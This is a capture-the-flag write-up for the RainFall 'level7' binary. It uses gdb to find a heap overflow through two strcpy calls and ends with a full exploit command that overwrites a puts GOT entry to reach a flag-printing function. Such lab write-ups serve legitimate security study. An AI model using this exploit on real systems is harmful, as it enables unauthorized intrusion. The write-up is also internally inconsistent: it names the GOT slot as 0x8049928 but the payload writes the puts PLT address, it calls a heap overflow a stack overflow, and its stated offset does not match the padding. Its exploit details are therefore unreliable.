We got the binary level7 that do :

	param_2 = av
	puVar1 size of 8
	puVar1 = 1
	puVar2 size of 8
	puVar1[1] = puVar2
	puVar3 size of 8
	puVar3 = 2
	puVar2 size of 8, previous malloced address in puVar1[1]
	puVar3[1] = puVar2, newly allocated address
	copy 1st srgument in puVar1[1], puVar1 as string, so puVar1[1] as char
	copy 2nd srgument in puVar3[1], puVar3 as string, so puVar3[1] as char
	open "/home/user/level8/.pass" in FILE *__stream
	set value of __stream in the global var c for the size of 0x44
	print "~~"

We check the value of the global c

```sh
(gdb) x/x 0x8049960
0x8049960 <c>:  0x00000000
```

When we try 

```sh
level7@RainFall:~$ ./level7 test re
~~
```

It works so the flag is in the global c, but if we want to check the value with gdb we don't have the rights to open the flag's file

On top of that we have 2 strcpy that are vuln to stack overflow but here the destination is on the heap

```
Program received signal SIGSEGV, Segmentation fault.
0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
```

## Find offset of the heap overflow

```sh
(gdb) run AAAABBBBCCCCDDDDEEEEFFFF test
(gdb) info registers
eax            0x74736574       1953719668
ecx            0xbffff910       -1073743600
edx            0x46464646       1179010630
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff6ec       0xbffff6ec
ebp            0xbffff718       0xbffff718
esi            0x0      0
edi            0x0      0
eip            0xb7eb1922       0xb7eb1922
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```
> So the offset is 6

```sh
(gdb) backtrace
#0  0xb7eb1922 in ?? () from /lib/i386-linux-gnu/libc.so.6
#1  0x080485c2 in main ()
(gdb) disas 0x080485c2
[...]
0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
0x080485c2 <+161>:   mov    $0x80486e9,%edx
```
> The offset goes to the 2nd strcpy

```sh
(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```
> We will replace the puts call in the GOT to our function

run `/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x00\x84\x04\x08"` `/bin/echo -ne "\xf4\x84\x04\x08"`

